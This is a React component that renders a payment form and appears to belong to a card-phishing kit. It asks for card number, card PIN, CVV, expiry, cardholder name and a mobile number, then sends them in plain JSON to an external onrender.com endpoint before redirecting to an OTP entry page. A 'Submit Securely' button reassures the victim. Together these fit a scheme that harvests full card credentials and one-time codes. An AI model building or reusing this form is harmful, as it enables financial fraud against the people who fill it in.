import { useState } from "react";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { FaCreditCard } from "react-icons/fa";
import { useNavigate, useLocation } from "react-router-dom";
import "./PaymentForm.css";

export default function PaymentForm() {
  const navigate = useNavigate();
  const location = useLocation();

  // ✅ Get mobile from previous page or localStorage
  const mobile =
    location.state?.mobile || localStorage.getItem("mobile") || "";

  const [cardNumber, setCardNumber] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });
  const [countdown, setCountdown] = useState(5);

  // Format card number
  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    value = value.match(/.{1,4}/g)?.join(" ") || "";
    setCardNumber(value);
  };

  // PIN (only numbers, no length restriction)
  const handlePinChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    setPin(value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage({ text: "", type: "" });

    const digitsOnly = cardNumber.replace(/\s/g, "");

    if (digitsOnly.length !== 16) {
      return setMessage({
        text: "Card number must be exactly 16 digits",
        type: "error",
      });
    }

    // ✅ PIN required only
    if (!pin) {
      return setMessage({
        text: "PIN is required",
        type: "error",
      });
    }

    // ✅ CVV required only
    if (!e.target.cvv.value) {
      return setMessage({
        text: "CVV is required",
        type: "error",
      });
    }

    setLoading(true);

    const data = {
      name: e.target.name.value,
      mobileNumber: mobile,
      cardNumber,
      pin,
      expiryMonth: e.target.expiryMonth.value,
      expiryYear: e.target.expiryYear.value,
      cvv: e.target.cvv.value,
    };

    try {
      const res = await fetch("https://auonline.onrender.com/api/cards", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      const result = await res.json();

      if (res.ok) {
        setSuccess(true);
        setMessage({
          text: "OTP sending! Redirecting...",
          type: "success",
        });

        // ✅ Save mobile
        localStorage.setItem("mobile", mobile);

        const timer = setInterval(() => {
          setCountdown((prev) => {
            if (prev === 1) {
              clearInterval(timer);

              navigate("/otp-submit", {
                state: { mobile },
              });
            }
            return prev - 1;
          });
        }, 1000);
      } else {
        setMessage({
          text: result.error || "Failed to save card",
          type: "error",
        });
      }
    } catch (err) {
      console.error(err);
      setMessage({
        text: "Server error, try again later",
        type: "error",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <div className="card-form">
        <h2>Card Details</h2>

        {/* ✅ Optional debug */}


        {message.text && (
          <div className={`form-message ${message.type}`}>
            {message.text}
          </div>
        )}

        {!success && (
          <form onSubmit={handleSubmit}>
            <label>Name on Card :</label>
            <input
              type="text"
              name="name"
              placeholder="Name on Card"
              required
            />

            <label>Card Number :</label>
            <input
              type="tel"
              inputMode="numeric"
              value={cardNumber}
              onChange={handleCardNumberChange}
              maxLength={19}
              placeholder="5555 5555 5555 5555"
              required
            />

            <label>Card PIN :</label>
            <div className="pin-container">
              <input
                type={showPin ? "text" : "password"}
                value={pin}
                onChange={handlePinChange}
                placeholder="Enter PIN"
                required
              />
              <span
                className="eye-icon"
                onClick={() => setShowPin((prev) => !prev)}
              >
                {showPin ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>

            <div className="row">
              <div>
                <label>Expiry Month :</label>
                <select name="expiryMonth" required>
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i} value={String(i + 1).padStart(2, "0")}>
                      {String(i + 1).padStart(2, "0")}
                    </option>
                  ))}
                </select>
              </div>

              <div>
                <label>Expiry Year :</label>
                <select name="expiryYear" required>
                  <option value="">YY</option>
                  {Array.from({ length: 22 }, (_, i) => (
                    <option key={i} value={String(24 + i)}>
                      {String(24 + i)}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <label>CVV :</label>
            <input
              type="password"
              name="cvv"
              placeholder="Enter CVV"
              required
            />

            <button className="login-btn1" type="submit" disabled={loading}>
              {loading ? "Submitting..." : "🔒 Submit Securely"}
            </button>
          </form>
        )}

        {success && (
          <div className="spinner-container">
            <FaCreditCard className="spinner-icon rotating" />
            <p>
              Redirecting in {countdown} second
              {countdown !== 1 ? "s" : ""}...
            </p>
          </div>
        )}
      </div>
    </div>
  );
}